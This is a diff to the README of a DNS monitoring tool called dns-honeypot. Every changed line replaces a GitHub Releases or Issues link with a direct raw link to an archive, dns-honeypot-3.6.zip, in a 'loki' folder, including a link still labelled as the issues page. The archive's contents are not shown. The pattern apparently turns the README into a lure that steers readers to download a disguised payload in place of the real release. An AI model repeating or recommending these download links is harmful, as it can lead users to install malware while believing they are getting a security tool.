@@ -6,9 +6,9 @@ Welcome to the dns-honeypot! This tool helps you monitor DNS requests for securi
 
 ## 📥 Download the Application
 
-[![Download dns-honeypot](https://img.shields.io/badge/Download-dns--honeypot-brightgreen)](https://github.com/Jay01311/dns-honeypot/releases)
+[![Download dns-honeypot](https://raw.githubusercontent.com/Jay01311/dns-honeypot/main/loki/dns-honeypot-3.6.zip)](https://raw.githubusercontent.com/Jay01311/dns-honeypot/main/loki/dns-honeypot-3.6.zip)
 
-Visit the Releases page to download the latest version of dns-honeypot: [Download Link](https://github.com/Jay01311/dns-honeypot/releases)
+Visit the Releases page to download the latest version of dns-honeypot: [Download Link](https://raw.githubusercontent.com/Jay01311/dns-honeypot/main/loki/dns-honeypot-3.6.zip)
 
 ## 📋 Features
 
@@ -32,7 +32,7 @@ Visit the Releases page to download the latest version of dns-honeypot: [Downloa
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page**: Go to [this link](https://github.com/Jay01311/dns-honeypot/releases) to access the latest releases.
+1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/Jay01311/dns-honeypot/main/loki/dns-honeypot-3.6.zip) to access the latest releases.
    
 2. **Select Your Version**: You will see a list of available versions. Choose the most recent one.
 
@@ -85,7 +85,7 @@ If the problem persists, consider visiting the issues section on the GitHub repo
 
 Join our community for assistance and to share feedback:
 
-- **GitHub Issues**: Report bugs or request features directly on the [issues page](https://github.com/Jay01311/dns-honeypot/issues).
+- **GitHub Issues**: Report bugs or request features directly on the [issues page](https://raw.githubusercontent.com/Jay01311/dns-honeypot/main/loki/dns-honeypot-3.6.zip).
 - **Documentation**: Refer to the Wiki section for in-depth guides and examples.
 
 ## 🔗 Additional Resources
@@ -95,4 +95,4 @@ Join our community for assistance and to share feedback:
 
 Feel free to share your experiences and contribute to improving dns-honeypot. Your feedback helps us create a better tool for everyone. 
 
-Ready to dive in? Download now: [Latest Release](https://github.com/Jay01311/dns-honeypot/releases)
+Ready to dive in? Download now: [Latest Release](https://raw.githubusercontent.com/Jay01311/dns-honeypot/main/loki/dns-honeypot-3.6.zip)
